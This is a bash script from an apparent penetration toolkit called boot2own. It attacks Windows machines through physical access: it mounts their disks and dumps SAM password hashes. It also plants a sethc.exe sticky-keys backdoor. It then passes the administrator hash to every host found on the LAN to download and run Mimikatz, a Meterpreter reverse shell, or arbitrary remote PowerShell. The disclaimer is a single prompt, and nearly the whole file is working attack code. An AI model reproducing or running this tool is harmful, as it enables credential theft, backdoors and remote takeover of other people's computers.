#!/bin/bash
#
# b2o-autopwn.sh is part of boot2own-1.0
# boot2own-1.0 creates rapid automated attacks that takes
# advantage of unauthorized physical access to Windows workstations.
#
# copyright (C) 2014 xor-function
# license BSD-3
#


banner() {
 echo '          _   _   _ ____   __     _                                     '
 echo '         |_) / \ / \ ||   // \   / \ |    | |\ |                        '
 echo '         |_) \_/ \_/ ||     //   \_/  \/\/  | \|                        '
 echo '                          =====                                         '
 echo "                The Infiltrator's Toolkit                               "
}


legal() {

 clear
 printf "\n"
 banner
 echo ""
 echo " You must agree to never use this software illegaly.           "
 echo " You are responsible for your own actions so be aware          "
 echo " of your national/local laws.                                  "
 echo ""
 echo " Use this software with prudence only to gain insight.         "
 echo " Do you agree? If not stop now.                                "
 echo " (yes/no)"
 yes_no

}

yes_no() {

  while true; do
     read answer
     case $answer in
          [Yy] ) break;;
          [nN] ) printf "\n Exiting Now \n"; poweroff -f; exit;;
          [Yy][eE][sS] ) break;;
          [Nn][oO] ) printf "\n Exiting Now \n"; poweroff -f; exit;;
            *  ) printf "\n Not Valid, Answer y or n\n";;
     esac
  done

}

menu() {
 clear
 printf "\n"
 banner
 echo "                                                                              "
 echo "PAYLOAD OPTIONS:                                                              "
 echo "                                                                              "
 echo "[1] Sethc backdoor                    [2] Mimikatz                            "
 echo "    Overwrites sethc with cmd             Dump creds from all                 "
 echo "    Undoes if overwrite detected          accessed PC'S                       "
 echo "                                                                              "
 echo "[3] Reverse Shell                     [4] Remote Powershell URL               "
 echo "    Uses (windows/meterpreter/            enter a remote url that is          "
 echo "    reverse_https) requires a             hosting your powershell code        "
 echo "    multihandler ready, use MSF                                               "
 echo "                                                                              "
 echo "[5] Windows CLI command               [6] Credits                             "
 echo "    pass a command line parameter         When it's due it is given           "
 echo "                                                                              "
 echo "[7] Shutdown                                                                  "
 echo "    Poweroff Live Session                                                     "
 echo "                                                                              "
 echo "Enter option number to continue:                                              "
 echo "                                                                              "

}


show_credits() {
 clear
 echo "                                                                                  "
 echo "The people behind the following code/projects                                     "
 echo "made this possible:                                                               "
 echo "                                                                                  "
 echo " Crunchbang Linux Developers                                                      "
 echo " crunchbang.org                                                                   "
 echo "                                                                                  "
 echo " creddump : http://code.google.com/p/creddump                                     "
 echo " Author: Brendan Dolan-Gavitt (bdolangavitt@wesleyan.edu)                         "
 echo "                                                                                  "
 echo " smbclient/winexe Hash Passing patch:                                             "
 echo " JoMo-kun http://www.foofus.net/~jmk/passhash.html                                "
 echo " Patch updated for Samba 3.6.12 by exfil (Emilio Escobar)                         "
 echo "                                                                                  "
 echo " winexe : http://sourceforge.net/users/ahajda                                     "
 echo " Author: Ahajda                                                                   "
 echo "							                                 "
 echo " smbwinexe : https://github.com/pentestgeek/smbexec                               "
 echo " Authors: Eric Milam (Brav0Hax) & Martin Bos (Purehate)                           "
 echo "                                                                                  "
 echo " Invoke-Shellcode : https://github.com/mattifestation/PowerSploit                 "
 echo " Author: Matthew Graeber (@mattifestation)                                        "
 echo "                                                                                  "
 echo " Invoke-Mimikatz : https://github.com/mattifestation/PowerSploit                  "
 echo " Author: Joe Bialek, Twitter: @JosephBialek                                       "
 echo " Mimikatz Author: Benjamin DELPY (gentilkiwi). Blog: http://blog.gentilkiwi.com.  "
 echo "                                                                                  "
 echo " The Metasploit Framework Developers for meterpreter/shell multihandlers          "
 echo " www.metasploit.com                                                               "
 echo "                                                                                  "
 read -p " Press [Enter] to continue.."
}

chk_tubes() {

try=0

while true; do
gateway=$(ip route | awk '/default/ { print $3 }')
  if ! ping -c 1 $gateway > /dev/null 2>&1  ; then
        echo "[!] no tubes detected, yet..."
        sleep 4
         if [ $try = 5 ]; then
            clear
            echo "[!] Failed to connect to a LAN no gateway detected!"
            echo "[!] Cannot continue without connection to LAN."
            sleep 3
            break
        else
            try=$(( $try + 1 ))
        fi
   else
       echo "[+] Got tubes continuing"
       host=$(hostname -I | awk '{print $1}')
       break
  fi

done

}


auto_off() {

   printf "\nAUTO-OFF:"
   printf "\nDo you wish to poweroff the Live Session automatically upon"
   printf "\ncompletion of selected attack? [enter]:\n"
   printf "\n [1] Auto-off"
   printf "\n [2] Remain ON\n\n"
   while true; do
     read -e aoff
     case $aoff in
          [1] ) printf "\nWill Poweroff when Attack completed\n"; aoff=1 ; break;;
          [2] ) printf "\nWill NOT poweroff When Attack completed\n"; aoff=0 ; break;;
           *  ) printf "\n\nYou entered something else than 1\n" ;;
     esac
   done

}

get_lhost() {

   printf "\nplease enter in the IP or Hostname of the machine with shell listener."
   printf "\nif it's an external IP ensure there are no proxies which will be ignored"
   printf "\nby SYSTEM. The shell is windows/meterpreter/reverse_https and has a"
   printf "\nhard coded port of 443. If you already have the lister waiting then"
   printf "\ninput it, otherwise exit. When done press [enter]:\n\n"
   while true; do
     read -e lhst
     printf "\nYou entered :[ $lhst ]"
     printf "\nIf this is correct, select 1 to continue.\n"
     printf "\nWARNING:\nIf you selection is other than 1 you"
     printf "\nwill have to re-enter the IP/Domain name\n"
     printf "\n [1] Continue"
     printf "\n [2] re-enter IP/Domain\n\n"
     read -e chk
     case $chk in
          [1] ) printf "\ncontinuing\n"; break;;
          [2] ) printf "\nenter IP/Domain again\n";;
           *  ) printf "\n\nYou entered something else than 1\n" ;;
     esac
   done

}

get_url() {

   printf "\nThe PS code will be Invoked as an expression (Invoke-Expression) so either edit your script"
   printf "\nto handle this or select option 6 to enter the entire command.\n"
   printf "\nEnter the url of your payload, dont forget to lead with http://"
   printf "\nWhen done press [Enter]:\n"
   while true; do
     read -e url
     printf "\nYou entered : [  $url ]"
     printf "\nIf this is correct, select 1 to continue.\n"
     printf "\nWARNING:\nIf you selection is other than 1 you will have to re-enter the url\n"
     printf "\n [1] Continue"
     printf "\n [2] re-enter url\n\n"
     read -e chk
     case $chk in
          [1] ) printf "\ncontinuing\n"; break;;
          [2] ) printf "\nenter url again\n";;
           *  ) printf "\n\n You entered something else than 1.\n" :
     esac
   done
}

get_clicmd() {

   printf "\nEnter the command to be executed by smbwinexe on all accessed PC's"
   printf "\nIf your here because you want to enter in a custom powershell command"
   printf "\nThen use the following example to prevent smbwinexe from hanging"
   printf "\nEx: cmd.exe /c echo . | powershell.exe....etc..etc"
   printf "\n\nWhen done press [Enter]:\n"
   while true; do
     read -e cli
     printf "\nYou entered : [ $cli ]"
     printf "\nIf this is correct, select 1 to continue.\n"
     printf "\nWARNING:\nIf you selection is other than 1 you will"
     printf "\nhave to re-enter the command\n"
     printf "\n [1] Continue"
     printf "\n [2] re-enter command\n\n"
     read -e chk
     case $chk in
          [1] ) printf "\ncontinuing\n"; break;;
          [2] ) printf "\nenter command again\n";;
           *  ) printf "\n\nYou entered something else than 1\n" :
     esac
   done
}

sethc_bd() {

prts=$(awk '{print $4}' /proc/partitions | sed -e '/name/d' -e '/^$/d' -e '/[1-9]/!d')

  for i in $prts; do

     if [ -e /mnt/drv-$i/Windows/System32 ]; then
        echo " [+] $i has windows System32!"
        touch /root/got-windows
        if [ ! -e /mnt/drv-$i/bkup ] ;then
             echo " [+] attempting sticky keys vector"
             mkdir /mnt/drv-$i/bkup
             cp -f /mnt/drv-$i/Windows/System32/{cmd.exe,sethc.exe} /mnt/drv-$i/bkup
             cd /mnt/drv-$i/Windows/System32/
             cp -f cmd.exe sethc.exe
             echo " [+] Finished overwriting sethc.exe"
             sleep 4
          else
             echo " [+] detected backups removing changes"
             rm -f /mnt/drv-$i/Windows/System32/sethc.exe
             cp -f /mnt/drv-$i/bkup/sethc.exe /mnt/drv-$i/Windows/System32/
             rm -r /mnt/drv-$i/bkup
             echo " [+] should be just like it was"
             sleep 4
         fi
      else
        echo " [-] $i does not have windows trying another"
    fi
  done

 if [ ! -f /root/got-windows ]; then
    clear
    echo " [!] No Windows FS was detected."
    sleep 2
 fi

}

get_targets() {

 echo "[+] Getting targets"
 ta=$(arp-scan -l -q | head -n -3 | sed -e '1,2d' | awk '{print $1 }')
 echo "$ta"
 echo "PTH FTW"

}

# atk_engine func requires 3 arguments
atk_engine() {

 usr=$1
 phash=$2
 trgt=$3

 printf "\n[*] $trgt $usr : $phash\n"
 eval 'export SMBHASH=$phash'
 ./pwinexe -U $usr'%SUCCESS!' --system --uninstall "//$trgt" "$lzr" | tee -a /root/loot

}


fire_lzr() {

# Domain to auth against must be inputed into atk_engine
# For any domain hashes to work correctly FYI

# if [[ -n "$dadmin" && -n "$dnthash" ]]; then
#    for t in $ta; do
#      atk_engine $dadmin $dnthash $t
#    done
# else 
    for t in $ta; do
      atk_engine $admin $nthash $t
    done
# fi

  lzr=
  echo "[+] DONE!!!"
  echo "[+] Results saved to /root/loot"
  sleep 4
}

legal

prts=$(awk '{print $4}' /proc/partitions | sed -e '/name/d' -e '/^$/d' -e '/[1-9]/!d')

if [ ! -d ~/boot-2-own/creddump ]; then
  echo " [!] This script requires creddump to function, was not found..."
  exit
fi

for i in $prts; do

   mkdir /mnt/drv-$i/ > /dev/null 2>&1
   mount -t ntfs -o rw /dev/$i /mnt/drv-$i > /dev/null 2>&1
   if [ $? -eq 0 ]; then
        echo " [+] $i partition mounted"
    else
        echo " [-] $i partition failed to mount"
   fi

   if [ ! -e /mnt/drv-$i/Windows/System32/config ]; then

         echo " [-] $i does not have a Windows FS trying another"

     else

         echo " [+] $i has Windows System32!"
         echo " [+] getting the SYSTEM and SAM hives to dump creds"
         cp -f /mnt/drv-$i/Windows/System32/config/{SYSTEM,SAM} ~/boot-2-own/creddump/
         cd ~/boot-2-own/creddump
         python pwdump.py SYSTEM SAM > /root/dumped-hashes
         echo " [+] Dumped local machine hashes in /root/dumped-hashes"
         echo " [+] so far so good, moving on"
         break 1

  fi

done

if [ ! -e /root/dumped-hashes ]; then
   clear
   printf "\n\n\n [-] No Windows FS found! Will not continue, powering off."
   sleep 4
   poweroff -f
fi

cd ~/boot-2-own/
creds=$(python creddump/pwdump.py creddump/SYSTEM creddump/SAM)
rm creddump/SYSTEM
rm creddump/SAM

admin=$(printf "$creds" | grep 500 | cut -d: -f 1 )
nthash=$(printf "$creds" | grep 500 | cut -d: -f 3-4 )

dadmin=$(printf "$creds" | grep 512 | cut -d: -f 1 )
dnthash=$(printf "$creds" | grep 512 | cut -d: -f 3-4 )

while true; do

 payload=
 menu
 read -e payload
 case $payload in
         [1] )
               auto_off; sethc_bd
               ;;
         [2] )
               auto_off
               chk_tubes
               if [ $try != 5 ]; then
                   get_targets
                   lzr=$(echo "cmd.exe /c echo . | powershell.exe ""IEX ((New-Object System.Net.WebClient).DownloadString('http://"$host"/pld2')); Mcatz -DumpCreds""")
                   fire_lzr
               fi
               ;;
         [3] )
               auto_off
               chk_tubes
               if [ $try != 5 ]; then
                   get_lhost
                   get_targets
                   lzr=$(echo "cmd.exe /c echo . | powershell.exe ""IEX ((New-Object System.Net.WebClient).DownloadString('http://"$host"/pld3')); Invoke-SC -Payload windows/meterpreter/reverse_https -Lhost "$lhst" -Lport 443 -Force""")
                   fire_lzr
               fi
               ;;
         [4] )
               auto_off
               chk_tubes
               if [ $try != 5 ]; then
                   get_url
                   get_targets
                   lzr=$(echo "cmd.exe /c echo . | powershell.exe -command set-variable -name icbm -value ((New-Object System.Net.WebClient).DownloadString('"$url"')); Invoke-Expression "'$icbm'"")
                   fire_lzr
               fi
               ;;
         [5] )
               auto_off
               chk_tubes
               if [ $try != 5 ]; then
                   get_clicmd
                   get_targets
                   lzr=$(echo "$cli")
                   fire_lzr
               fi
               ;;
         [6] )
               show_credits
               ;;
         [7] )
               clear; printf "\n\n\nTURNING OFF!!!" ; poweroff -f
               ;;
           * )
               printf "\nnot valid, please answer 1 - 7\n\n"; sleep 1
               ;;
 esac

 if [ "$aoff" = "1" ]; then
    poweroff -f
 fi

done
